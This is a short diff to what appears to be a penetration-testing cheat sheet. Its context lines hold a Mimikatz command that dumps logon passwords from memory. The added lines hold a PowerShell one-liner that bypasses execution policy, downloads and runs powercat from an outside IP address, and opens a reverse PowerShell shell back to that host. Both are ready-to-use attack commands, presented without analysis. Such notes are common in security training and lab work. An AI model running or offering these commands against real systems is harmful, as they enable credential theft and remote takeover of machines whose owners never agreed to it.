@@ -3489,3 +3489,8 @@ Mimikatz one-liner
 ```
 .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
 ```
+
+Powershell one liner with powercat
+```
+powershell.exe -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.184/powercat.ps1');powercat -c 192.168.45.184 -p 443 -e powershell"
+```
